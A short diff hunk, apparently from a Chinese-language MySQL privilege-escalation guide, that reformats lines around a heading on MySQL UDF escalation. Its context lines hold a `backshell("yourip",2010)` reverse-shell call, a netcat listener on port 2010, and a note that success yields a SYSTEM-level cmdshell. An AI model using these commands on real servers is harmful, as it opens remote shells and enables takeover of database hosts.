@@ -72,5 +72,7 @@ select backshell ("yourip",2010)
 ```bash
 nc -vv -l -p 2010     
 ```   
-成功后，你将获得一个 system 权限的 cmdshell
-***Mysql  udf 提权*** 
+成功后，你将获得一个 system 权限的 cmdshell  
+
+***Mysql udf 提权*** 
+
